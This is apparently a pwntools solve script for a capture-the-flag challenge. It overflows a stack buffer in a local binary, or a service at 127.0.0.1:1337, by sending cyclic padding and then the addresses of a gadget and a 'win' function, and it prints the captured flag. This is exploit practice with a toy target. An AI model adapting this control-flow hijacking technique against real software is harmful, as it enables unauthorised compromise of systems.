#!/usr/bin/env python
import pwn

REMOTE_ADDR = "127.0.0.1"
REMOTE_PORT = "1337"

# specific to my terminal - st
pwn.context.terminal = ["st", "-e", "sh", "-c"]

# helper function
addr_to_offset = lambda num: pwn.cyclic_find(num.to_bytes(4, "little"))

def get_challenge(elf):
    if pwn.args.REMOTE:
        chal = pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    elif pwn.args.GDB:
        chal = pwn.process(elf.path)
        pwn.gdb.attach(chal, """
                       b * vuln + 120
                       c
                       """)
    else:
        chal = pwn.process(elf.path)
    return chal

elf = pwn.ELF("./chal")
chal = get_challenge(elf)

base_padding = pwn.cyclic(addr_to_offset(0x62616166))
exploit = (
    base_padding
  + pwn.p64(elf.symbols["gadget"])
  + pwn.p64(elf.symbols["win"])
)
chal.sendline(exploit)

chal.readuntil("gamers! ")

flag = chal.readline().strip().decode()

chal.close()

print(f"We got the flag: \"{flag}\"")
